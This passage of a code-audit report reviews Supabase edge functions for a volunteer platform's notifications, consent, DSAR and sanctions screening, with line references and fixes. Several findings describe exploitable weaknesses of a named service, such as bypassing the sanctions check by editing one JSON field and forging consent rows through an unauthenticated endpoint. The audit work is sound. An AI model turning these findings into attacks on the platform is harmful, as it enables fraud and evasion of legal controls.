- **Where:** supabase/functions/send-project-blast/index.ts:224-240 (insert new blast row each call → new blastId), :250-253 (idem key `blast-${blastId}-${user_id}`), :326-329 (serial batched send loop), :331-347 (recipient rows + final status written only AFTER the whole loop)
- **What breaks:** Verified: per-recipient idempotency keys are tied to the freshly-inserted blastId, so a retry inserts a NEW blast row with NEW keys — no dedup across attempts. The send loop is serial Promise.allSettled batches of 25 over up to MAX_RECIPIENTS=5000; if it exceeds the edge wall-clock limit the function dies before line 337, leaving status='sending' forever with no recipient rows and no final counts. An admin who sees it 'stuck' and retries re-sends the entire blast to everyone — thousands of duplicate emails + duplicate in-app notifications.
- **Smallest fix:** Derive idempotency from a stable request key (hash of projectId+subject+body, or a client-supplied blast idempotency key) not the row id; write recipient rows incrementally; reconcile/resume a 'sending' blast on retry instead of inserting a new one.

### [High] process-notification-fanout silently abandons a job on chunk error — no retry, no audit, no alert, partial fan-out  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/process-notification-fanout/index.ts:77-80 (on chunk error: push summary with remaining:-1 then `break`, loop advances to next job)
- **What breaks:** Verified: when process_notification_fanout_chunk returns an error mid-job, the loop breaks and moves on. Remaining pending fanout rows are neither retried nor flagged; no audit_log row, no admin alert (the summary lives only in the HTTP response, which a cron invocation discards). Some recipients get their notification, the rest are silently dropped. This is the exact 'admin project-status change fan-out' the file (header comment :4-5) was written to make reliable, and it fails open to data loss with no signal.
- **Smallest fix:** On chunk error emit an audit_log/edge error event and either retry with backoff or leave the job claimed for the next tick; never advance past a job whose rows are still pending without recording the failure.

### [High] Internal secret compared with plain === (timing side-channel) and defaults to the raw service-role key, which the caller then sprays in a custom header  `security` (CONFIRMED)
- **Where:** supabase/functions/send-community-agreement-trigger/index.ts:54 (`internalSecret = INTERNAL_FN_SECRET || serviceKey`) and :57 (`incomingInternal === internalSecret`); caller sends it at notify-applicant-status/index.ts:744 (`headers: { 'x-internal-secret': serviceKey }`)
- **What breaks:** Verified two problems. (1) The equality is a non-constant-time JS string compare — unlike the hardened timingSafeEqualStr at _shared/service-role-auth.ts:20-28 — leaking the secret to a timing attacker probing the endpoint. (2) If INTERNAL_FN_SECRET is unset, the accepted secret IS the service-role key, and the caller literally transmits the service-role key in a custom x-internal-secret header — spraying the crown-jewel credential across a second header namespace/logs/proxies and making admin-bypass hinge on a timing-vulnerable compare of the most privileged credential.
- **Smallest fix:** Use timingSafeEqualStr; require a dedicated INTERNAL_FN_SECRET and fail closed if unset (never fall back to the service key); never transmit the service-role key as the internal secret.

### [High] notify-critical-fix marks a critical fingerprint 'pushed' even when zero recipients received it — permanently suppressing the alert  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/notify-critical-fix/index.ts:92-121 (recipients starts 0; only resp.ok increments it at :110; the triage_critical_push_log row is inserted at :115 with recipients_count regardless of value, and totalSent++ at :121)
- **What breaks:** Verified second-order data loss: if every admin push for a fingerprint fails (push outage, all-expired subscriptions, send-push-notification down) recipients stays 0, yet the code still inserts the triage_critical_push_log row and increments totalSent. Because the next run filters out any fingerprint already in triage_critical_push_log (:63-68), that critical error fingerprint is marked 'pushed' FOREVER and is never re-alerted — the platform silently drops the alert for a real production error the moment the push channel has a transient failure. Combined with the swallowed per-push catch (:111-113), there is no signal this happened.
- **Smallest fix:** Only write the push-log row (and count it) when recipients>0; when recipients==0 despite existing subscriptions, skip the log and emit an audit event so the fingerprint stays eligible and admins learn the push channel failed.
- _added-in-verification_

### [Medium] process-notification-fanout has no job lock; overlapping cron runs double-process and duplicate notifications  `boundary` (PLAUSIBLE)
- **Where:** supabase/functions/process-notification-fanout/index.ts:62 (list_pending_fanout_jobs p_limit:5) then :70-91 iterate; scheduled 'every minute' per header comment :7
- **What breaks:** Nothing in this caller claims a job before processing. If a run exceeds the cron interval (up to 20 chunks × 500 = 10k rows), the next cron fires and list_pending_fanout_jobs returns the SAME still-pending jobs, so two invocations process overlapping chunks of the same job. Duplicate notifications result UNLESS process_notification_fanout_chunk atomically claims-and-deletes rows — not visible in this repo slice and not guaranteed by this caller. PLAUSIBLE pending the RPC's internals.
- **Smallest fix:** Claim jobs with a status/locked_by/locked_at transition (FOR UPDATE SKIP LOCKED semantics) in list_pending_fanout_jobs, or take an advisory lock per job id so only one worker processes it.

### [Medium] Discord welcome-post idempotency is a read-then-write TOCTOU across a Discord round-trip — concurrent calls double-post to the public channel  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/notify-applicant-status/index.ts:665-704 (SELECT audit_log for prior 'discord_welcome_posted' → postProjectWelcome() network POST → INSERT the marker)
- **What breaks:** Verified: the 'idempotent per application' guard reads audit_log (:665-671), then makes a network POST to Discord (:674), then writes the marker (:680-686). Two concurrent calls (double-click, retry, second admin) both read 'no prior welcome' and both post → two public @-mention welcome messages pinging the user and role in channel 1506083368679379044. No unique constraint enforces single-post; the window spans a full Discord round-trip.
- **Smallest fix:** Enforce uniqueness in the DB (unique partial index on audit_log(event_type,record_id) or a dedicated welcome_posted flag with an atomic conditional update) and treat a conflict as 'already posted' before calling Discord.

### [Medium] send-community-agreement-trigger and send-project-blast bypass withAuditWrapper; unguarded top-level RPCs crash with no telemetry  `error-handling` (CONFIRMED)
- **Where:** send-community-agreement-trigger/index.ts:44 (bare Deno.serve; unguarded await mark_community_agreement_required at :100) and send-project-blast/index.ts:76 (bare Deno.serve)
- **What breaks:** Verified: every other function in the section wraps in withAuditWrapper (_shared/audit.ts:162-193), which emits an edge_function_error audit row + trace id on any uncaught throw. These two do not. In send-community-agreement-trigger the RPC at :100 sits outside any try/catch, so a throw there yields a generic runtime 500 with no audit row, no trace id, no admin alert — invisible to the triage/monitoring pipeline the rest of the platform relies on.
- **Smallest fix:** Wrap both handlers in withAuditWrapper (section convention) and/or add try/catch around the top-level RPCs.

### [Medium] Three functions write the notifications table with a raw INSERT, bypassing the self-healing outbox/DLQ guarantee the safe-path comment advertises  `ownership` (CONFIRMED)
- **Where:** Raw insert: quest-nudge/index.ts:79-85, resume-application-reminder/index.ts:116-122, send-project-blast/index.ts:294-305. Safe path: notify-applicant-status/index.ts:497-504 and notify-class-published/index.ts:134 use rpc('safe_create_notification'), documented at notify-applicant-status:493-496 as enqueue+retry+DLQ+admin-alert.
- **What breaks:** Verified: the notifications table has two writers with different reliability contracts. The advertised 'outbox worker retries with backoff, DLQs after 5 attempts, admin alert fires automatically' holds ONLY for safe_create_notification callers. quest-nudge, resume-application-reminder and send-project-blast do a plain insert — a failure is only console.error'd (and in send-project-blast:310-312 fully swallowed in an empty catch). The stated notification-delivery guarantee silently does not hold for nudges, reminders, and blasts, and a maintainer reading the safe-path comment will assume it does.
- **Smallest fix:** Route all notification writes through safe_create_notification so retry/DLQ/alerting apply uniformly; make it the single owner/entrypoint for the notifications table.

### [Medium] send-push-notification blanks the expired endpoint on 410, and the sole caller ignores the 410 body — dead subscriptions are never pruned  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/send-push-notification/index.ts:127-131 (on 410/404 returns `endpoint: ''` — comment 'so caller can clean up') and caller notify-critical-fix/index.ts:110 only counts `resp.ok`, never inspects the 410 body
- **What breaks:** Verified: the 410 response deliberately returns an empty endpoint string, and the only caller in this section does not read the 410 at all. Expired/invalid push_subscriptions rows are never deleted; they accumulate, every critical-fix run re-POSTs to dead endpoints (wasted work + skewed recipients_count), and no code path reaps them. The comment promising caller cleanup is unfulfilled on both sides.
- **Smallest fix:** Return the real endpoint (or subscription id) on 410 and have callers delete the matching push_subscriptions row, or prune server-side so a 410 self-cleans.

### [Medium] notify-critical-fix throws on null error_message (500s the whole critical batch) and swallows every individual push failure  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/notify-critical-fix/index.ts:91 (`item.error_message.slice(0,120)` no null guard) and :111-113 (`catch (_e) { /* ignore individual failures */ }`)
- **What breaks:** Verified: agent_fix_queue.error_message is selected raw with no null coalesce; a null value makes `.slice` throw, and with no local try/catch around :91 the throw unwinds to withAuditWrapper → the entire critical-push batch 500s and NO admin is alerted about ANY critical error that tick. Separately, per-subscription push failures (non-410) are silently ignored, so a systemic push outage reads as 'sent: 0' with no error surfaced — the opposite of what a critical-alert lane needs.
- **Smallest fix:** Null-coalesce error_message before slice; count push failures and emit an audit event when recipients==0 for a fingerprint that had subscriptions.

### [Medium] notify-critical-fix 'push once' guarantee depends on an unchecked log insert written AFTER sending; cap and log are both non-atomic read-then-write  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/notify-critical-fix/index.ts:89-121 (pushes at :95, triage_critical_push_log insert at :115 with no error check; totalSent++ at :121 regardless) and hourly cap at :41-45
- **What breaks:** Verified: the 'each fingerprint pushes at most once' invariant is enforced only by writing triage_critical_push_log, and that insert's error is never checked — a failed/rolled-back insert leaves the fingerprint eligible again next run → duplicate critical pushes to every admin. Because pushes are sent BEFORE the log row is written, a crash between :121 and the next tick also re-pushes. The hourly cap (:41-45) is a read-then-write with no atomicity: two overlapping cron runs both pass the cap and exceed the 3/hour hard limit.
- **Smallest fix:** Insert the log row (relying on its UNIQUE constraint) BEFORE sending and treat a unique-violation as 'already pushed'; check the insert error; make the cap an atomic single-SQL claim.

### [Medium] active_participant re-runs re-fire the community-agreement flow, duplicating the in-app training-offer notification; the status UPDATE has no optimistic guard  `error-handling` (CONFIRMED)
- **Where:** notify-applicant-status/index.ts:735-749 (mark_community_agreement_required + invoke send-community-agreement-trigger every time status is active_participant) and :429-432 (unconditional UPDATE, no `.eq('applicant_status', oldStatus)`); send-community-agreement-trigger/index.ts:170-177 (safe_create_notification with no idempotency key)
- **What breaks:** Verified: setting active_participant again (typo correction, re-save, retry) re-invokes send-community-agreement-trigger before the agreement is signed (it only 409s once signed at :94). Its email is idempotent by day (stable key :189), but the in-app 'Project Training Offer' notification (:170-177) is created fresh with no dedup, so the teammate gets duplicate offer notifications. The status UPDATE at :429-432 is unconditional, so two admins racing different transitions both fire full side-effect chains (e.g. a rejection email AND a Discord role assignment).
- **Smallest fix:** Gate the trigger on an actual transition (update ... where applicant_status <> 'active_participant' returning) and give the agreement notification a stable idempotency key.

### [Medium] project_applications carries two parallel status columns (applicant_status vs status) written/read by different subsystems with no reconciliation  `ownership` (PLAUSIBLE)
- **Where:** applicant_status written at notify-applicant-status/index.ts:431 and read at send-community-agreement-trigger/index.ts:91; separate `status` column filtered at send-project-blast/index.ts:162 (`.eq('status','completed')`)
- **What breaks:** Verified in code that both columns are referenced on the same table with no code reconciling them (schema not in this slice, hence PLAUSIBLE). notify-applicant-status owns applicant_status (pending_review…active_participant); send-project-blast targets its audience by status='completed'. It is trivially easy to blast the wrong cohort — an active_participant whose `status` was never set to 'completed' is excluded, a stale 'completed' still receives blasts after leaving. Two status facts on one row with no single owner is the classic 'two copies disagree eventually' trap.
- **Smallest fix:** Document/consolidate which column is authoritative for which decision, or derive the blast audience from applicant_status; add a constraint/comment clarifying the relationship.

### [Medium] Silent no-op when an active teammate has no Discord id — role never assigned, no audit, admin sees success:true  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/notify-applicant-status/index.ts:628-733 (role assignment runs only `if (discordRoleId)` then `if (applicantDiscordUserId)`; profile lookup uses .single() at :630 inside the try that swallows to :730)
- **What breaks:** Verified: if the project has no discord_role_id, or the applicant profile has no discord_user_id (or .single() throws on a missing profile), the whole branch is skipped with NO audit row and NO alert — only assignment failures (:715-723) and welcome failures (:692-699) are audited, not the 'never attempted' case. The teammate silently never gets their project role, the response still returns success:true with discordRoleAssigned:false, and no one is notified. At scale this quietly locks active teammates out of their Discord project channels.
- **Smallest fix:** Emit an audit event (e.g. discord_role_skipped_no_id) when the role or discord id is absent, and surface it in the response.

### [Medium] Long serial fan-outs in one invocation risk edge timeout, leaving the tail of recipients silently un-notified  `under-engineering` (CONFIRMED)
- **Where:** notify-class-published/index.ts:133-148 (serial safe_create_notification per follower), quest-nudge/index.ts:71-136 (serial functions.invoke per candidate), notify-critical-fix/index.ts:89-114 (serial fetch per subscription)
- **What breaks:** Verified: each iterates an unbounded/large recipient set with a per-item awaited network/RPC call, no batching or concurrency cap. A class with many followers, a tick with hundreds of inactive quest users, or many admin subscriptions can exceed the edge wall-clock limit and kill the invocation partway. notify-class-published leaves the tail of followers un-notified with no resume state; quest-nudge at least gates last_nudged_at on delivery so survivors retry next tick, but still burns to a timeout instead of paginating.
- **Smallest fix:** Batch/paginate with bounded concurrency and a hard per-run recipient budget with resumable cursor state, rather than one unbounded serial loop.

### [Medium] Timing-unsafe service-role key compare in four functions while the hardened timingSafeEqualStr exists and is used by only one  `security` (CONFIRMED)
- **Where:** process-notification-fanout/index.ts:31 (`token === SERVICE_KEY`), quest-nudge/index.ts:36 (`authHeader !== \`Bearer ${serviceKey}\``), resume-application-reminder/index.ts:29 (same), send-push-notification/index.ts:42 (same); hardened path _shared/service-role-auth.ts:20-28 timingSafeEqualStr, used only by notify-critical-fix/index.ts:34
- **What breaks:** Verified: four cron-gated functions authenticate by a non-constant-time JS === compare of the full service-role key — the exact timing side-channel that service-role-auth.ts:3-13 was written to eliminate and that the first pass flagged for send-community-agreement-trigger. A timing attacker who can hit these public function URLs can probe the most privileged credential in the system. The hardened helper already exists but is adopted by only one of the section's functions — silent security drift where the safe primitive is present but unused.
- **Smallest fix:** Replace every plain ===/!== service-key compare with authorizeServiceRoleRequest / timingSafeEqualStr; make the helper the single service-role entrypoint so new functions can't miss it.
- _added-in-verification_

### [Medium] notify-applicant-status trusts applicationId, applicantUserId and projectId as independent payload UUIDs and never confirms the status UPDATE hit a row  `boundary` (CONFIRMED)
- **Where:** supabase/functions/notify-applicant-status/index.ts:405-414 (three UUIDs pulled from the payload with no cross-validation) and :429-432 (UPDATE ... .eq('id', applicationId) with no .select() / row-count check)
- **What breaks:** Verified: the three UUIDs are validated only for shape (:213-215); nothing checks that applicantUserId is actually the applicant on applicationId, or that applicationId belongs to projectId. A Supabase UPDATE that matches zero rows returns error:null, so a valid-but-mismatched or non-existent applicationId produces updateError=null and the handler proceeds to send the in-app notification/email to the payload's applicantUserId/applicantEmail and assign the payload project's Discord role — all reported as success:true even though no application row changed. An admin (or a confused/compromised caller) can drive notifications, emails and Discord-role grants for entities that were never actually transitioned, with no integrity signal.
- **Smallest fix:** Load the application row first (or use `.update(...).eq('id',applicationId).select().single()`), verify it exists and that its user_id/project_id match the payload, and 404/400 on mismatch before firing any side effect.
- _added-in-verification_

### [Low] escapeHtml reimplemented twice alongside the shared helper with divergent null handling  `under-engineering` (CONFIRMED)
- **Where:** Local copies: notify-applicant-status/index.ts:150-157 and send-community-agreement-trigger/index.ts:35-42 (param typed `string`); shared canonical: _shared/escape-html.ts:6 (`String(input ?? '')`), used by notify-class-published and quest-nudge
- **What breaks:** Verified: three implementations of the same security-critical escape. The shared one coerces null/undefined; the local copies type the param as string and throw on a non-string (e.g. notify-applicant-status:459 builds projectName from admin/client-controlled fields that can be undefined). Divergence means a future hardening of the escape lands in one copy and silently misses the others — exactly the regression class the shared file's header (:1-5) warns about.
- **Smallest fix:** Delete both local escapeHtml functions and import escapeHtml from _shared/escape-html.ts everywhere.

### [Low] Inconsistent supabase-js import source and pin across the section (esm.sh@2.49.1 vs npm:@2)  `dependency` (CONFIRMED)
- **Where:** quest-nudge/index.ts:2 and resume-application-reminder/index.ts:2 import from https://esm.sh/@supabase/supabase-js@2.49.1; the others use npm:@supabase/supabase-js@2 (e.g. notify-applicant-status:15, send-project-blast:16)
- **What breaks:** Verified: two CDNs and two version specifiers for the same client in one section. The esm.sh functions add a runtime dependency on esm.sh availability (an esm.sh outage breaks quest-nudge and resume reminders but not the rest) and pin 2.49.1 while the others float on npm:2 — so behavior can diverge between functions calling the same RPCs (safe_create_notification, enqueue_email_v2). Supply-chain + reproducibility drift.
- **Smallest fix:** Standardize every function on one import source and an exact pin (npm:@supabase/supabase-js@<exact>) via an import map.

### [Low] wasDelivered advances the one-shot/debounce gate on in-app success even when the primary email channel failed  `error-handling` (CONFIRMED)
- **Where:** _shared/nudge-delivery.ts:18-24 (`return inAppOk || (emailAttempted && emailOk)`); used by quest-nudge/index.ts:126 (7-day suppression) and resume-application-reminder/index.ts:129 (fires-once-ever)
- **What breaks:** Verified: for resume-application-reminder the gate is one-shot forever. If the in-app insert succeeds but the email invoke returns { error } (email is the reminder's real reach — a draft applicant may never revisit the in-app inbox), wasDelivered still returns true and resume_reminder_sent_at is stamped permanently. The applicant then never receives the email reminder, and the failure is only a console.error. The helper's own doc frames in-app-OR-email as 'delivered', but for a fire-once email reminder that masks permanent email loss.
- **Smallest fix:** For one-shot email reminders require emailOk (when attempted) before stamping the permanent gate, or record a retry state instead of treating in-app-only as terminal.

### [Low] notify-class-published accepts a malformed UUID via a weak regex  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/notify-class-published/index.ts:83 (`/^[0-9a-f-]{36}$/i`)
- **What breaks:** Verified: this pattern accepts any 36-char string of hex-and-dashes (e.g. 36 dashes, wrong dash placement), not a real UUID — contrast the strict UUID_RE at notify-applicant-status:41 and send-project-blast:33. Harmless here because it feeds .eq('id',...) which won't match, but it is inconsistent validation that will be copy-pasted into a context where it matters.
- **Smallest fix:** Reuse the strict UUID regex used elsewhere in the section.

### [Low] safe_create_notification / notification failures are logged but not surfaced; class-publish returns 200 ok:true while dropping notifications  `error-handling` (CONFIRMED)
- **Where:** notify-class-published/index.ts:142-153 (increments `failed`, console.error, still returns 200 ok:true) and send-project-blast/index.ts:310-312 (notification insert catch fully swallowed, no counter)
- **What breaks:** Verified: notify-class-published returns HTTP 200 with ok:true even when failed>0 — a cron/caller checking status sees success while some followers got nothing. send-project-blast's in-app notification failure is swallowed entirely (empty catch), so the recipient row records notification_id:undefined with no error captured and notification_sent_count is understated with no diagnostic. Both violate recover/retry/report for a per-recipient failure.
- **Smallest fix:** Return a non-2xx or explicit partial-failure flag when failed>0; capture the notification error into the recipient row / audit instead of an empty catch.

---

## Edge: Consent, privacy & DSAR

### [High] revoke-recording-consent returns ok:true even when the write fails — recording consent is never actually revoked  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/revoke-recording-consent/index.ts:34-64
- **What breaks:** Verified in code: the SELECT for `existing` (line 34) destructures only `{ data }` and discards `error`; the UPDATE (lines 43-46) and the INSERT (lines 48-57) are awaited but neither captures `{ error }`. Line 64 then unconditionally returns json({ ok: true }). If RLS denies the write, the id is stale, or the DB errors transiently, the user is told 'consent revoked' while `recording_consents` was never modified. Blast radius: the platform keeps using a recording the user legally withdrew consent for (T&C §11), with a false success confirmation on record — a swallowed failure that neither recovers, retries, nor reports.
- **Smallest fix:** Capture `{ error }` from both the update and insert; on error return json({ error: 'revoke_failed' }, 500) instead of ok:true. Check the SELECT error too and fail rather than falling through to a blind insert.

### [High] screen-sanctions screens a client-supplied country_code with no server-side geo — the export-control gate is a one-field bypass  `security` (CONFIRMED)
- **Where:** supabase/functions/screen-sanctions/index.ts:47-53
- **What breaks:** `country` is taken purely from `body.country_code` (line 47) and fed to isEmbargoed (line 52). No `cf-ipcountry` or server geo is consulted — even though record-consent (index.ts:52-55) already reads cf-ipcountry/x-vercel-ip-country, proving the pattern exists in-repo. Screening runs pre-account during registration, so the client fully controls the value: a user physically in Iran/Russia posts `country_code:"US"` and gets `decision:"allow"`. The whole OFAC/EAR sanctions control (T&C §19 / ToU §17) is defeated by editing one JSON field, while `sanctions_screenings` records a tidy 'allow' as false compliance evidence. (Note: the audit-write-failure half is now fixed — lines 74-77 fail closed with 503 — but the client-trust hole is untouched.)
- **Smallest fix:** Derive country from `req.headers.get('cf-ipcountry')` and screen on that; if a claimed country_code is also accepted, deny/flag on mismatch. Never let the screened value be purely client-provided.

### [High] Embargoed-region entries (Crimea/Donetsk/Luhansk) can never match a real country code — sanctioned regions are silently unscreened  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/_shared/compliance.ts:31-37; supabase/functions/screen-sanctions/index.ts:48-52
- **What breaks:** EMBARGOED_COUNTRIES contains `UA-43`,`UA-14`,`UA-09` (compliance.ts:31-33) and isEmbargoed does an exact `Set.has(code.toUpperCase())` (line 37). A geo source (cf-ipcountry) only ever emits the ISO-2 code `UA` for all of Ukraine; the subdivision suffix is never produced. The regex at index.ts:48 permits `-XXX` but nothing generates it, and no self-reporting user volunteers their own sanctioned oblast. So a user in Crimea/Donetsk/Luhansk screens as `UA` -> not in set -> `allow`, and the three region rows are dead code creating a false belief the regions are covered. This gets strictly worse if finding #2 is fixed, because cf-ipcountry can only ever return `UA`.
- **Smallest fix:** Resolve subdivision codes from a real geo source and pass them in, or (interim) flag all `UA` plus high-risk oblasts for manual review; delete the illusion of subdivision coverage that never fires.

### [High] record-consent is a public, unauthenticated, service-role table write with client-controlled anon_id and no rate limit — forges and floods the consent evidence trail  `security` (CONFIRMED)
- **Where:** supabase/functions/record-consent/index.ts:19-23,43-44,58-108
- **What breaks:** Verified: SUPABASE_SERVICE_ROLE_KEY (line 59, RLS bypass) INSERTs into `cookie_consents` (line 98) for any client-supplied `anon_id` (line 43), no auth required, CORS `*` (line 20), and NO rate limit anywhere. The new best-effort dedupe (lines 70-96) only suppresses byte-identical repeats for one identifier — an attacker who varies `categories`, `policy_version`, or `anon_id` sails straight past it, so unbounded inserts and fabricated consent rows for an arbitrary/guessable anon_id (e.g. marketing=true) remain fully possible. These rows are the legal GDPR proof-of-consent, so an attacker can forge or poison another visitor's consent evidence and flood the DB at 767+ user scale. `categories` (line 44) is stored as an unvalidated jsonb blob.
- **Smallest fix:** Add per-IP rate limiting (enforceEdgeRateLimit already exists), validate `categories` against the four known boolean keys, and route the write through a SECURITY DEFINER RPC that binds anon_id/user_id to the caller instead of a raw service-role insert of client data.

### [High] submit-dispute rate limiter fails open — silently disabling the impersonation protection its own comment claims  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/submit-dispute/index.ts:32-45; supabase/functions/_shared/edge-rate-limit.ts:29,32
- **What breaks:** The T-H comment (index.ts:38-39) says the cap exists because an unrated dispute insert 'enables impersonation, starts the §20 clock, and floods the admin tab.' But enforceEdgeRateLimit returns `{ allowed: true }` on ANY limiter RPC error (edge-rate-limit.ts:29) or exception (line 32) — fail-open, and the header comment (line 4) even admits it. So exactly when the DB is under attack or the limiter RPC is missing, the cap vanishes and unlimited disputes flow. Combined with email being only regex-validated, never verified (index.ts:34), an attacker starts the 30-day statutory §20 clock on arbitrary victims' emails and floods the admin Compliance tab — the precise harm the comment claims is prevented.
- **Smallest fix:** For a legal-clock-starting endpoint, fail CLOSED (or degrade to a stricter static cap) when the limiter errors; do not treat limiter unavailability as unlimited. Require email ownership/verification before the §20 clock starts.

### [High] screen-sanctions decision is advisory-only — a 'deny' is recorded but nothing server-side enforces it at account creation  `security` (PLAUSIBLE)
- **Where:** supabase/functions/screen-sanctions/index.ts:52-79
- **What breaks:** The function computes decision/reason, persists a `sanctions_screenings` row, and returns `{ decision }` to the caller (line 79) — but the account does not yet exist and this endpoint neither creates nor blocks it. Enforcement therefore depends entirely on the client honoring the 'deny' response before it proceeds to register. A caller that ignores the JSON and simply calls the signup path next is never re-screened, so even with correct server-side geo the export-control control is decoupled from the transaction it is meant to gate. The audit row says 'deny' while the sanctioned user registers anyway — a compliant-looking record over an unenforced control.
- **Smallest fix:** Enforce the screening inside the account-creation transaction (server-side signup RPC checks/writes the latest deny for the caller) rather than trusting the client to act on an advisory response; reject registration when the most recent screening for the identity/IP is a deny.
- _added-in-verification_

### [Medium] Function auth annotations contradict actual behavior across the whole section — verify_jwt / deploy-gate misconfiguration risk  `other` (CONFIRMED)
- **Where:** dsar-submit/index.ts:1; record-consent/index.ts:1; submit-dispute/index.ts:1,5; screen-sanctions/index.ts:1,4-7
- **What breaks:** Every annotation is wrong against its own code: dsar-submit is `@edge-public` but hard-requires a Bearer JWT (lines 34,51-52); record-consent is `@edge-auth required` but is explicitly public/service-role with auth optional (lines 62-68); submit-dispute is `@edge-auth required` while its docstring says 'Public endpoint' (line 5); screen-sanctions is `@edge-cron` but is a request-driven, auth-less registration endpoint (docstring lines 4-7). If any CI gate, Supabase `verify_jwt` config, or deploy tooling keys off these markers it will either lock out a public endpoint (breaking the cookie banner or registration) or expose one it believes is protected. At minimum every reviewer is misled about the trust boundary of a compliance function.
- **Smallest fix:** Correct each annotation to match reality and reconcile with the actual config.toml verify_jwt setting; treat the annotation as the authoritative gate input or delete it.

### [Medium] dsar-submit, record-policy-acknowledgment, and record-consent leak raw Postgres error text to the client  `security` (CONFIRMED)
- **Where:** dsar-submit/index.ts:60; record-policy-acknowledgment/index.ts:61; record-consent/index.ts:108
- **What breaks:** All three return the raw DB/RPC error string to the caller: dsar-submit `json({ error: rpcErr.message }, 500)` (line 60), record-policy-acknowledgment `json({ error: error.message }, 500)` (line 61), and record-consent `json({ error: error.message }, 500)` (line 108). This leaks schema names, constraint names, function signatures, and PGRST codes to an attacker probing the most sensitive (privacy-rights / consent) surface — and it is inconsistent with submit-dispute and screen-sanctions which correctly log server-side and return generic `internal_error`/`screening_unavailable`. Information disclosure exactly on the DSAR and consent endpoints.
- **Smallest fix:** console.error the real message and return a generic `{ error: 'internal_error' }` with status 500 on all three, matching submit-dispute's pattern.

### [Medium] Docstrings promise info@techfleet.network email notifications that are never sent — statutory SLAs depend on someone watching a dashboard  `error-handling` (PLAUSIBLE)
- **Where:** dsar-submit/index.ts:6-7,62-64; revoke-recording-consent/index.ts:5,60-62; submit-dispute/index.ts:67-68
- **What breaks:** dsar-submit's header says 'notify info@techfleet.network' but the body sends no email and lines 62-64 admit 'No separate email queue exists.' revoke-recording-consent's header says 'Notifies info@techfleet.network' but the body (lines 60-62) only assumes an unshown System Health digest job watches the table. submit-dispute relies on a 'daily digest cron' (lines 67-68). These are legally clocked events — GDPR DSAR 30-day SLA, §11 recording-revocation, §20 dispute clock — and the 'report' half is a comment, not code, with no real-time alert. MEMORY records that this exact platform has silently failed prod crons/migrations, so a DSAR can blow its statutory deadline with zero alerting while the docstrings mislead maintainers into believing real-time notification exists.
- **Smallest fix:** Implement the promised notification (or an explicit, monitored queue-insert) with an SLA-breach alert, or delete the false promise and document the actual monitored digest mechanism.

### [Medium] Consent state is fragmented across three tables with no single owner — withdrawal via one path never propagates to the others  `ownership` (CONFIRMED)
- **Where:** record-consent/index.ts:98; revoke-recording-consent/index.ts:42-58; dsar-submit/index.ts:17-19,55-59
- **What breaks:** The 'does this subject consent' fact is split three ways with no reconciliation: cookie_consents (record-consent line 98), recording_consents (revoke-recording-consent lines 42-58), and a `withdraw_consent` DSAR type (dsar-submit) that writes only dsar_requests via submit_dsar (lines 55-59) and touches neither consent table. A user who files a withdraw_consent DSAR still shows marketing=true in cookie_consents and granted recordings in recording_consents; a banner 'reject all' never touches recording consent. No owner answers 'is this user consented' — the textbook two/three-copies-that-disagree red flag. The platform acts on stale consent and produces contradictory evidence when a regulator asks for one subject's consent history.
- **Smallest fix:** Define one consent-state owner (service/RPC) that all three paths write through or that derives a unified view; make withdraw_consent DSAR fan out to the concrete consent tables rather than only logging a request.

### [Medium] record-policy-acknowledgment silently drops policy keys outside a hardcoded allow-list — incomplete legal acceptance records + UI/edge drift  `boundary` (CONFIRMED)
- **Where:** supabase/functions/record-policy-acknowledgment/index.ts:22-40
- **What breaks:** `keys` is filtered to VALID_KEYS (line 39) and a 400 is only returned when ALL keys are invalid (line 40). If the frontend adds or renames a policy key not mirrored in this hardcoded Set, that acknowledgment is silently discarded — the user sees a successful accept but the legally-required record of accepting that specific policy version is never written, with no error surfaced. The allow-list is duplicated between UI and edge with no shared source, guaranteeing eventual drift, and the gap lands exactly on newly-added policies (T&C §23 / ToU §19) — the highest-risk moment.
- **Smallest fix:** Source valid policy keys from one shared definition (or the DB) used by both UI and edge; reject an unknown key loudly (400 with the offending key) rather than silently dropping it.

### [Medium] Unbounded/unvalidated JSON persisted on privacy endpoints — dsar payload and record-consent categories accept arbitrary client blobs  `under-engineering` (CONFIRMED)
- **Where:** dsar-submit/index.ts:40,55-59; record-consent/index.ts:44,98-107
- **What breaks:** dsar-submit accepts `body.payload` as any object (line 40) and forwards it verbatim as jsonb to submit_dsar (line 57) with no size or shape cap while every scalar elsewhere is sliced. record-consent accepts `categories` as any object (line 44) and stores it directly (lines 98-107). An authenticated user (DSAR) or any anonymous caller (consent, no rate limit) can post multi-megabyte nested JSON per request — a cheap storage-amplification/DoS vector and a way to smuggle unexpected keys into compliance tables. At 767+ users plus bots, jsonb bloat degrades the admin Privacy/Compliance queries that scan these tables.
- **Smallest fix:** Cap serialized payload/categories size (reject > a few KB) and validate categories against the four known boolean flags; reject unknown structure rather than persisting it.

### [Medium] revoke-recording-consent has no idempotency — repeated or concurrent revokes insert duplicate revocation rows  `ownership` (CONFIRMED)
- **Where:** supabase/functions/revoke-recording-consent/index.ts:34-58
- **What breaks:** The UPDATE only fires when an UNREVOKED row exists (`.is('revoked_at', null)`, line 39). Once a row is revoked, every later call for the same session_ref finds nothing and INSERTs a fresh 'future-uses' revoked row (lines 48-57). A double-click or a client retry-on-timeout accumulates unbounded duplicate revocation rows for one session_ref; two concurrent revokes both read no unrevoked row and both insert (read-then-write race). The result is a polluted recording_consents table where the true revocation history is ambiguous — undermining the very audit this endpoint exists to provide.
- **Smallest fix:** Add a unique constraint on (user_id, session_ref, scope) with an upsert/on-conflict, or short-circuit when an already-revoked row exists.

### [Medium] audit.ts silently caps and drops audit events per isolate under load — error/compliance audit rows lost exactly during incidents; the promised security-event bypass does not exist  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/audit.ts:83-103,113-115
